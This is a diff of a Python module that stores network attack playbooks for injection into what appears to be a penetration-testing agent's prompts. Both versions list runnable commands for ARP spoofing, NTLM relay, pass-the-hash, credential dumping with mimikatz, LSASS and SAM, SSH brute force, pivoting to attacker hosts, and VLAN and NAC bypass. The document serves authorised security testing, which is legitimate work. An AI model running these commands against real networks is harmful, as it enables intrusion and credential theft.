@@ -1,16 +1,15 @@
 """Network security knowledge base.
 
-Deep knowledge about network security testing:
-1. Network reconnaissance
-2. Service exploitation
-3. Network pivoting
-4. Protocol attacks
-5. Lateral movement
+Deep knowledge about network-level vulnerabilities:
+1. Protocol attacks (DNS, ARP, DHCP)
+2. Network service exploitation
+3. Man-in-the-Middle techniques
+4. Lateral movement
+5. Network segmentation bypass
 """
 
 from __future__ import annotations
 
-from collections import defaultdict
 from dataclasses import dataclass, field
 from typing import Any
 
@@ -20,246 +19,195 @@ logger = structlog.get_logger()
 
 
 @dataclass
-class NetworkVulnPattern:
-    """A network vulnerability pattern."""
+class NetworkPattern:
+    """A network security pattern."""
     pattern_id: str = ""
     name: str = ""
     category: str = ""
     severity: str = "high"
-    protocols: list[str] = field(default_factory=list)
-    mitre_tactic: str = ""
     description: str = ""
-    testing_methodology: str = ""
+    detection_strategy: str = ""
+    protocols: list[str] = field(default_factory=list)
     tools: list[str] = field(default_factory=list)
 
     def to_dict(self) -> dict[str, Any]:
         return {
             "id": self.pattern_id,
-            "name": self.name[:30],
-            "category": self.category[:12],
+            "name": self.name[:25],
+            "category": self.category[:15],
         }
 
 
-NETWORK_VULN_PATTERNS: list[dict[str, Any]] = [
+NETWORK_PATTERNS: list[dict[str, Any]] = [
     {
-        "id": "net-001", "name": "Network Reconnaissance",
-        "category": "recon", "severity": "medium",
-        "protocols": ["ICMP", "TCP", "UDP", "ARP"],
-        "mitre": "TA0043",
-        "desc": "Network enumeration and mapping.",
-        "testing": (
-            "NETWORK RECONNAISSANCE:\n"
-            "1. HOST DISCOVERY:\n"
-            "   - ARP scan (LAN):\n"
-            "     arp-scan -l\n"
-            "     nmap -sn -PR 192.168.1.0/24\n"
-            "   - ICMP sweep:\n"
-            "     nmap -sn -PE 10.0.0.0/8\n"
-            "   - TCP SYN discovery:\n"
-            "     nmap -sn -PS80,443,22,445 10.0.0.0/24\n"
-            "   - UDP discovery:\n"
-            "     nmap -sn -PU53,161,500 10.0.0.0/24\n"
-            "2. PORT SCANNING:\n"
-            "   - TCP SYN scan (fast):\n"
-            "     nmap -sS -T4 --top-ports 1000 {target}\n"
-            "   - Full port scan:\n"
-            "     nmap -sS -p- --min-rate 10000 {target}\n"
-            "   - UDP scan (slow):\n"
-            "     nmap -sU --top-ports 100 {target}\n"
-            "   - Version detection:\n"
-            "     nmap -sV -sC -p{ports} {target}\n"
-            "   - masscan (ultra-fast):\n"
-            "     masscan {cidr} -p1-65535 --rate 100000\n"
-            "3. SERVICE ENUMERATION:\n"
-            "   - Banner grabbing:\n"
-            "     nmap -sV --version-intensity 5 {target}\n"
-            "   - Script scanning:\n"
-            "     nmap --script=default,vuln {target}\n"
-            "   - SMB enumeration:\n"
-            "     enum4linux -a {target}\n"
-            "     smbclient -L \\\\{target}\n"
-            "   - SNMP enumeration:\n"
-            "     snmpwalk -v2c -c public {target}\n"
-            "     onesixtyone -c community.txt {target}\n"
-            "   - DNS enumeration:\n"
-            "     dnsrecon -d {domain}\n"
-            "     dig axfr @{dns_server} {domain}\n"
-            "4. OS FINGERPRINTING:\n"
-            "   - Active: nmap -O {target}\n"
-            "   - Passive: p0f on network tap"
-        ),
-        "tools": ["nmap", "masscan", "enum4linux", "dnsrecon"],
-    },
-    {
-        "id": "net-002", "name": "Service Exploitation",
-        "category": "exploitation", "severity": "critical",
-        "protocols": ["SMB", "SSH", "RDP", "FTP", "HTTP", "SNMP"],
-        "mitre": "TA0001",
-        "desc": "Network service exploitation techniques.",
-        "testing": (
-            "SERVICE EXPLOITATION:\n"
-            "1. SMB (445):\n"
-            "   - EternalBlue (MS17-010):\n"
-            "     nmap --script smb-vuln-ms17-010 {target}\n"
-            "   - Null session:\n"
-            "     smbclient -N -L \\\\{target}\n"
-            "   - Relay attacks:\n"
-            "     responder -I eth0 -wrf\n"
-            "     ntlmrelayx.py -t {target} -smb2support\n"
-            "   - Password spraying:\n"
-            "     crackmapexec smb {targets} -u users.txt -p password.txt\n"
-            "2. SSH (22):\n"
-            "   - Brute force:\n"
-            "     hydra -L users.txt -P pass.txt ssh://{target}\n"
-            "   - Key-based auth testing\n"
-            "   - Username enumeration (CVE-2018-15473):\n"
-            "     ssh-audit {target}\n"
-            "3. RDP (3389):\n"
-            "   - BlueKeep (CVE-2019-0708):\n"
-            "     nmap --script rdp-vuln-ms12-020 {target}\n"
-            "   - NLA bypass\n"
-            "   - Brute force:\n"
-            "     crowbar -b rdp -s {target}/32 -u admin -C pass.txt\n"
-            "4. FTP (21):\n"
-            "   - Anonymous login:\n"
-            "     ftp {target} → anonymous:anonymous@\n"
-            "   - vsftpd 2.3.4 backdoor\n"
-            "   - ProFTPD mod_copy (unauthenticated file copy)\n"
-            "5. SNMP (161):\n"
-            "   - Default community strings:\n"
-            "     onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt {target}\n"
-            "   - SNMPv3 user enumeration\n"
-            "6. DNS (53):\n"
-            "   - Zone transfer:\n"
-            "     dig axfr @{ns} {domain}\n"
-            "   - DNS cache poisoning\n"
-            "   - DNS rebinding"
-        ),
-        "tools": ["nmap", "hydra", "crackmapexec", "responder", "ntlmrelayx"],
-    },
-    {
-        "id": "net-003", "name": "Network Pivoting",
-        "category": "pivoting", "severity": "high",
-        "protocols": ["TCP", "SSH", "SOCKS"],
-        "mitre": "TA0008",
-        "desc": "Network pivoting and tunneling.",
-        "testing": (
-            "NETWORK PIVOTING:\n"
-            "1. SSH TUNNELING:\n"
-            "   - Local port forward:\n"
-            "     ssh -L 8080:{internal}:80 user@{pivot}\n"
-            "   - Dynamic SOCKS proxy:\n"
-            "     ssh -D 1080 user@{pivot}\n"
-            "     proxychains nmap -sT {internal_target}\n"
-            "   - Remote port forward:\n"
-            "     ssh -R 4444:localhost:4444 user@{pivot}\n"
-            "2. CHISEL:\n"
-            "   - Server (attacker): chisel server --reverse -p 8000\n"
-            "   - Client (pivot): chisel client {attacker}:8000 R:socks\n"
-            "   - Then: proxychains nmap {internal}\n"
-            "3. LIGOLO-NG:\n"
-            "   - Proxy (attacker): ./proxy -selfcert\n"
-            "   - Agent (pivot): ./agent -connect {attacker}:11601 -ignore-cert\n"
-            "   - Create tunnel interface on attacker\n"
-            "   - Route internal subnets through tunnel\n"
-            "4. DOUBLE PIVOT:\n"
-            "   - Pivot 1 → Pivot 2 → Target\n"
-            "   - SSH chaining: ssh -J user@pivot1 user@pivot2\n"
-            "   - Nested SOCKS proxies\n"
-            "5. PORT FORWARDING:\n"
-            "   - socat: socat TCP-LISTEN:8080,fork TCP:{target}:80\n"
-            "   - netsh (Windows): netsh interface portproxy add v4tov4\n"
-            "   - iptables: iptables -t nat -A PREROUTING ...\n"
-            "6. DNS TUNNELING:\n"
-            "   - dnscat2: DNS-based C2 channel\n"
-            "   - iodine: IP over DNS tunnel"
-        ),
-        "tools": ["ssh", "chisel", "ligolo-ng", "proxychains", "socat"],
-    },
-    {
-        "id": "net-004", "name": "Protocol Attacks",
+        "id": "net-001", "name": "DNS Security Issues",
         "category": "protocol", "severity": "high",
-        "protocols": ["ARP", "DHCP", "DNS", "LLMNR", "NBT-NS", "mDNS", "VLAN"],
-        "mitre": "TA0006",
-        "desc": "Layer 2/3 protocol attacks.",
-        "testing": (
-            "PROTOCOL ATTACKS:\n"
-            "1. ARP:\n"
-            "   - ARP spoofing/poisoning:\n"
-            "     arpspoof -i eth0 -t {target} {gateway}\n"
-            "     ettercap -T -M arp:remote /{target}// /{gateway}//\n"
-            "   - MITM traffic interception\n"
-            "2. LLMNR/NBT-NS/mDNS:\n"
-            "   - Responder (poison name resolution):\n"
-            "     responder -I eth0 -wrf\n"
-            "   - Capture NTLMv2 hashes\n"
-            "   - Relay captured hashes:\n"
-            "     ntlmrelayx.py -tf targets.txt -smb2support\n"
-            "3. DHCP:\n"
-            "   - DHCP starvation:\n"
-            "     Exhaust DHCP pool\n"
-            "   - Rogue DHCP server:\n"
-            "     Set attacker as gateway → MITM\n"
-            "4. VLAN:\n"
-            "   - VLAN hopping (switch spoofing):\n"
-            "     DTP negotiation to become trunk port\n"
-            "   - Double tagging:\n"
-            "     802.1Q double-encapsulated frames\n"
-            "   - VLAN enumeration:\n"
-            "     yersinia -I (interactive mode)\n"
-            "5. IPv6:\n"
-            "   - Router advertisement spoofing:\n"
-            "     * Inject malicious IPv6 router advertisements\n"
-            "     * Redirect traffic through attacker\n"
-            "   - mitm6: IPv6 MITM + WPAD/DNS takeover\n"
-            "     mitm6 -d {domain}\n"
-            "     ntlmrelayx.py -6 -t ldaps://{dc} --delegate-access\n"
-            "6. ROUTING:\n"
-            "   - BGP hijacking (ISP level)\n"
-            "   - OSPF/EIGRP route injection"
+        "desc": "DNS protocol vulnerabilities and attacks.",
+        "detection": (
+            "DNS SECURITY:\n"
+            "DNS ZONE TRANSFER:\n"
+            "  dig axfr @<nameserver> <domain>\n"
+            "  host -l <domain> <nameserver>\n"
+            "  If successful: full zone data including internal records\n"
+            "DNS ENUMERATION:\n"
+            "  - Brute force subdomains:\n"
+            "    gobuster dns -d <domain> -w <wordlist>\n"
+            "    dnsrecon -d <domain> -t brt\n"
+            "  - DNSSEC walking (NSEC enumeration):\n"
+            "    dnsrecon -d <domain> -t zonewalk\n"
+            "  - Reverse DNS: dnsrecon -r <ip-range>\n"
+            "DNS CACHE POISONING:\n"
+            "  - Requires predictable TXID or lack of source port randomization\n"
+            "  - Check: dig +short porttest.dns-oarc.net TXT\n"
+            "  - Modern mitigation: DNSSEC, DNS cookies\n"
+            "DNS REBINDING:\n"
+            "  - Register domain with low TTL\n"
+            "  - First request resolves to attacker IP\n"
+            "  - Second request resolves to internal IP (127.0.0.1)\n"
+            "  - Bypasses same-origin policy for internal access\n"
+            "  - Tools: singularity, rebind.network\n"
+            "DNS TUNNELING:\n"
+            "  - Encode data in DNS queries/responses\n"
+            "  - Bypasses network firewalls that allow DNS\n"
+            "  - Detection: Look for unusual DNS query lengths, entropy"
         ),
-        "tools": ["responder", "ntlmrelayx", "ettercap", "yersinia", "mitm6"],
+        "protocols": ["dns"],
+        "tools": ["dig", "dnsrecon", "gobuster"],
     },
     {
-        "id": "net-005", "name": "Lateral Movement",
-        "category": "lateral", "severity": "critical",
-        "protocols": ["SMB", "WMI", "WinRM", "RDP", "SSH", "DCOM"],
-        "mitre": "TA0008",
-        "desc": "Post-exploitation lateral movement techniques.",
-        "testing": (
-            "LATERAL MOVEMENT:\n"
-            "1. PASS-THE-HASH:\n"
-            "   - crackmapexec:\n"
-            "     cme smb {targets} -u admin -H {ntlm_hash} --exec-method smbexec\n"
-            "   - impacket:\n"
-            "     psexec.py admin@{target} -hashes :{ntlm_hash}\n"
-            "     wmiexec.py admin@{target} -hashes :{ntlm_hash}\n"
-            "     smbexec.py admin@{target} -hashes :{ntlm_hash}\n"
-            "2. PASS-THE-TICKET:\n"
-            "   - Kerberos ticket extraction:\n"
-            "     mimikatz: sekurlsa::tickets /export\n"
-            "   - Ticket injection:\n"
-            "     export KRB5CCNAME=ticket.ccache\n"
-            "     psexec.py -k -no-pass {target}\n"
-            "3. WINRM:\n"
-            "   - evil-winrm:\n"
-            "     evil-winrm -i {target} -u admin -H {hash}\n"
-            "   - PowerShell remoting:\n"
-            "     Enter-PSSession -ComputerName {target} -Credential admin\n"
-            "4. DCOM:\n"
-            "   - dcomexec.py:\n"
-            "     dcomexec.py admin@{target} -hashes :{hash}\n"
-            "5. SSH KEY REUSE:\n"
-            "   - Find SSH keys: find / -name id_rsa 2>/dev/null\n"
-            "   - Try keys on other hosts:\n"
-            "     ssh -i found_key user@{other_host}\n"
-            "6. CREDENTIAL HARVESTING:\n"
-            "   - mimikatz: sekurlsa::logonpasswords\n"
-            "   - LaZagne: Extract credentials from software\n"
-            "   - Dump LSASS: procdump -ma lsass.exe\n"
-            "   - SAM dump: reg save HKLM\\SAM sam.bak"
+        "id": "net-002", "name": "SMB/NetBIOS Exploitation",
+        "category": "service", "severity": "critical",
+        "desc": "SMB/CIFS and NetBIOS attack patterns.",
+        "detection": (
+            "SMB/NETBIOS EXPLOITATION:\n"
+            "ENUMERATION:\n"
+            "  nmap -p 139,445 --script=smb-enum-* <target>\n"
+            "  enum4linux -a <target>\n"
+            "  smbclient -L //<target> -N  # Anonymous listing\n"
+            "  crackmapexec smb <target> -u '' -p '' --shares\n"
+            "NULL SESSION:\n"
+            "  smbclient //<target>/IPC$ -N\n"
+            "  rpcclient -U '' -N <target>\n"
+            "  - Enumerate: querydispinfo, enumdomusers, enumdomgroups\n"
+            "KNOWN VULNERABILITIES:\n"
+            "  - EternalBlue (MS17-010, CVE-2017-0144):\n"
+            "    nmap --script smb-vuln-ms17-010 <target>\n"
+            "  - PrintNightmare (CVE-2021-34527)\n"
+            "  - PetitPotam (NTLM relay via MS-EFSRPC)\n"
+            "  - sAMAccountName spoofing (CVE-2021-42278/42287)\n"
+            "RELAY ATTACKS:\n"
+            "  - NTLM relay: ntlmrelayx.py -t <target> -smb2support\n"
+            "  - Coerce authentication: Responder, PetitPotam\n"
+            "  - Capture: responder -I <interface> -rdwv\n"
+            "SHARE ENUMERATION:\n"
+            "  - List all shares with permissions\n"
+            "  - Check for writable shares\n"
+            "  - Look for sensitive files (passwords, configs, backups)"
         ),
-        "tools": ["crackmapexec", "impacket", "evil-winrm", "mimikatz", "LaZagne"],
+        "protocols": ["smb", "netbios"],
+        "tools": ["enum4linux", "smbclient", "crackmapexec"],
+    },
+    {
+        "id": "net-003", "name": "ARP Poisoning and MITM",
+        "category": "mitm", "severity": "high",
+        "desc": "ARP spoofing and man-in-the-middle attacks.",
+        "detection": (
+            "ARP POISONING AND MITM:\n"
+            "ARP SPOOFING:\n"
+            "  - arpspoof -i <interface> -t <victim> <gateway>\n"
+            "  - ettercap -T -M arp:remote /<victim>// /<gateway>//\n"
+            "  - bettercap -eval 'set arp.spoof.targets <victim>; arp.spoof on'\n"
+            "TRAFFIC INTERCEPTION:\n"
+            "  - Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward\n"
+            "  - Capture with tcpdump/wireshark\n"
+            "  - SSL stripping: sslstrip -l 8080\n"
+            "  - mitmproxy for HTTPS inspection\n"
+            "CREDENTIAL CAPTURE:\n"
+            "  - Responder: Capture NTLM, HTTP Basic, FTP credentials\n"
+            "  - Ettercap: Auto-detect and log credentials\n"
+            "  - Bettercap: net.sniff on, set net.sniff.verbose true\n"
+            "DETECTION:\n"
+            "  - Detect ARP spoofing: arp -a, look for duplicate MACs\n"
+            "  - Network monitoring: arpwatch\n"
+            "  - IDS signatures for ARP anomalies\n"
+            "MODERN MITIGATIONS:\n"
+            "  - Dynamic ARP Inspection (DAI)\n"
+            "  - 802.1X port-based authentication\n"
+            "  - Static ARP entries for critical hosts"
+        ),
+        "protocols": ["arp", "ethernet"],
+        "tools": ["bettercap", "ettercap", "responder"],
+    },
+    {
+        "id": "net-004", "name": "Lateral Movement Techniques",
+        "category": "post_exploitation", "severity": "critical",
+        "desc": "Techniques for moving between systems.",
+        "detection": (
+            "LATERAL MOVEMENT:\n"
+            "WINDOWS TECHNIQUES:\n"
+            "  Pass-the-Hash (PtH):\n"
+            "    crackmapexec smb <targets> -u <user> -H <ntlm_hash>\n"
+            "    impacket-psexec <domain>/<user>@<target> -hashes :<ntlm_hash>\n"
+            "  Pass-the-Ticket (PtT):\n"
+            "    export KRB5CCNAME=/path/to/ticket.ccache\n"
+            "    impacket-psexec <domain>/<user>@<target> -k -no-pass\n"
+            "  WMI Execution:\n"
+            "    impacket-wmiexec <domain>/<user>:<pass>@<target>\n"
+            "  WinRM:\n"
+            "    evil-winrm -i <target> -u <user> -p <pass>\n"
+            "  PsExec:\n"
+            "    impacket-psexec <domain>/<user>:<pass>@<target>\n"
+            "LINUX TECHNIQUES:\n"
+            "  SSH Key Reuse:\n"
+            "    Find authorized_keys, id_rsa across systems\n"
+            "    ssh -i /path/to/key user@<target>\n"
+            "  Credential Reuse:\n"
+            "    Test discovered credentials on all systems\n"
+            "    crackmapexec ssh <targets> -u <user> -p <pass>\n"
+            "CREDENTIAL HARVESTING:\n"
+            "  - mimikatz: sekurlsa::logonpasswords\n"
+            "  - LSASS dump: procdump -ma lsass.exe\n"
+            "  - SAM/SYSTEM: reg save HKLM\\SAM sam.hiv\n"
+            "  - Kerberoasting: impacket-GetUserSPNs\n"
+            "  - AS-REP roasting: impacket-GetNPUsers"
+        ),
+        "protocols": ["smb", "wmi", "ssh", "winrm"],
+        "tools": ["crackmapexec", "impacket", "evil-winrm"],
+    },
+    {
+        "id": "net-005", "name": "VLAN and Segmentation Bypass",
+        "category": "network", "severity": "high",
+        "desc": "Bypassing network segmentation and VLAN isolation.",
+        "detection": (
+            "VLAN AND SEGMENTATION BYPASS:\n"
+            "VLAN HOPPING:\n"
+            "  Double tagging:\n"
+            "    - Craft frame with two 802.1Q tags\n"
+            "    - Outer tag matches native VLAN of trunk\n"
+            "    - Inner tag targets destination VLAN\n"
+            "    - yersinia -I <interface> -G  # VLAN attack tool\n"
+            "  Switch spoofing:\n"
+            "    - Negotiate DTP trunk with switch\n"
+            "    - modprobe 8021q; vconfig add <interface> <vlan_id>\n"
+            "    - If DTP is enabled, become trunk port\n"
+            "FIREWALL BYPASS:\n"
+            "  - Source port manipulation: nmap --source-port 53\n"
+            "  - IP fragmentation: nmap -f\n"
+            "  - Protocol tunneling: DNS, ICMP, HTTP\n"
+            "  - IPv6 tunneling (if IPv6 not filtered)\n"
+            "NAC BYPASS:\n"
+            "  - MAC spoofing: macchanger -r <interface>\n"
+            "  - 802.1X bypass: If hub or unmanaged switch\n"
+            "  - Pre-auth access: Check for DHCP and DNS before auth\n"
+            "TESTING:\n"
+            "  1. Identify network segments (traceroute, TTL analysis)\n"
+            "  2. Test cross-segment communication\n"
+            "  3. Check DTP status on switch ports\n"
+            "  4. Test firewall rules with various protocols\n"
+            "  5. Check for dual-homed hosts bridging segments"
+        ),
+        "protocols": ["802.1q", "dtp"],
+        "tools": ["yersinia", "nmap", "macchanger"],
     },
 ]
 
@@ -267,85 +215,61 @@ NETWORK_VULN_PATTERNS: list[dict[str, Any]] = [
 class NetworkSecurityKB:
     """Network security knowledge base.
 
-    Provides network security testing methodology
+    Provides network-level attack patterns
     injected into agent prompts.
     """
 
     def __init__(self) -> None:
-        self._patterns: dict[str, NetworkVulnPattern] = {}
+        self._patterns: dict[str, NetworkPattern] = {}
         self._log = logger.bind(component="network_security_kb")
         self._load_patterns()
 
     def _load_patterns(self) -> None:
-        """Load network vulnerability patterns."""
-        for data in NETWORK_VULN_PATTERNS:
-            pattern = NetworkVulnPattern(
+        """Load network patterns."""
+        for data in NETWORK_PATTERNS:
+            pattern = NetworkPattern(
                 pattern_id=data["id"],
                 name=data["name"],
                 category=data.get("category", ""),
                 severity=data.get("severity", "high"),
-                protocols=data.get("protocols", []),
-                mitre_tactic=data.get("mitre", ""),
                 description=data.get("desc", ""),
-                testing_methodology=data.get("testing", ""),
+                detection_strategy=data.get("detection", ""),
+                protocols=data.get("protocols", []),
                 tools=data.get("tools", []),
             )
             self._patterns[pattern.pattern_id] = pattern
 
-    def get_patterns_for_category(
-        self,
-        category: str,
-    ) -> list[NetworkVulnPattern]:
+    def get_by_category(self, category: str) -> list[NetworkPattern]:
         """Get patterns by category."""
         return [
             p for p in self._patterns.values()
-            if p.category == category
-        ]
-
-    def get_patterns_for_protocol(
-        self,
-        protocol: str,
-    ) -> list[NetworkVulnPattern]:
-        """Get patterns for a protocol."""
-        return [
-            p for p in self._patterns.values()
-            if protocol.upper() in [pr.upper() for pr in p.protocols]
+            if p.category.lower() == category.lower()
         ]
 
     def build_network_prompt(
         self,
         categories: list[str] | None = None,
-        protocol: str = "",
-        max_patterns: int = 3,
+        max_patterns: int = 4,
     ) -> str:
         """Build network security prompt."""
-        if protocol:
-            relevant = self.get_patterns_for_protocol(protocol)
-        elif categories:
-            relevant = []
-            for cat in categories:
-                relevant.extend(self.get_patterns_for_category(cat))
-        else:
-            relevant = list(self._patterns.values())
-
-        lines = ["## Network Security Testing\n"]
-        for pattern in relevant[:max_patterns]:
-            lines.append(f"### {pattern.name} [{pattern.severity.upper()}]")
-            if pattern.mitre_tactic:
-                lines.append(f"MITRE Tactic: {pattern.mitre_tactic}")
-            lines.append(pattern.testing_methodology)
+        lines = ["## Network Security Patterns\n"]
+        count = 0
+        for pattern in self._patterns.values():
+            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
+                continue
+            if count >= max_patterns:
+                break
+            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
+            lines.append(pattern.detection_strategy)
             lines.append("")
-
+            count += 1
         return "\n".join(lines)
 
     def get_stats(self) -> dict[str, Any]:
-        cat_counts: dict[str, int] = defaultdict(int)
-        proto_set: set[str] = set()
+        cat_counts: dict[str, int] = {}
         for p in self._patterns.values():
-            cat_counts[p.category] += 1
-            proto_set.update(p.protocols)
+            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
         return {
             "patterns": len(self._patterns),
-            "protocols": len(proto_set),
-            "by_category": dict(cat_counts),
+            "by_category": cat_counts,
         }
